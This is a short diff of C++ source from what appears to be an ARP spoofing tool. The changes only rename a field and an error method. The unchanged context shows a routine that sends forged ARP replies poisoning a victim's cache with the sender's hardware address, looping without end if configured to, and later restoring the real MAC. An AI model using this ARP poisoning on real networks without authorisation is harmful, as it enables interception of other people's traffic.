@@ -8,7 +8,7 @@ using namespace kni;
 
 void *routine_start_spoof(void *ptr) {
     auto args = (pthargs_spoof *) ptr;
-    auto netdb = args->netdb;
+    auto netdb = args->lan;
 
     std::unique_ptr<u_char[]> sndbuf(new u_char[ETHER_HDRLEN + ARP_HDRLEN]);
 
@@ -16,7 +16,7 @@ void *routine_start_spoof(void *ptr) {
     arp_io.prepare(sndbuf.get());
 
     if (!arp_io.open(netdb->devname)) {
-        KNI_LOG_ERROR("failed to open device \"%s\" :%s", netdb->devname.c_str(), arp_io.error());
+        KNI_LOG_ERROR("failed to open device \"%s\" :%s", netdb->devname.c_str(), arp_io.err());
         return nullptr;
     } else {
         KNI_LOG_DEBUG("device \"%s\" opened successfully.", netdb->devname.c_str());;
@@ -33,7 +33,7 @@ void *routine_start_spoof(void *ptr) {
             succ = arp_io.reply(args->victim_ip, netdb->devinfo.hw_addr, netdb->gateway_ip, netdb->gateway_mac);
 
         if (!succ)
-            KNI_LOG_ERROR("%s", arp_io.error());
+            KNI_LOG_ERROR("%s", arp_io.err());
 
         // If args->npackets < 0 then it becomes an infinite loop
         if (++count == args->npackets)
@@ -50,7 +50,7 @@ void *routine_start_spoof(void *ptr) {
             succ = arp_io.reply(args->victim_ip, args->victim_mac, netdb->gateway_ip, netdb->gateway_mac);
 
         if (!succ)
-            KNI_LOG_ERROR("%s", arp_io.error());
+            KNI_LOG_ERROR("%s", arp_io.err());
 
         if (i != args->npackets - 1)
             sleep(3);
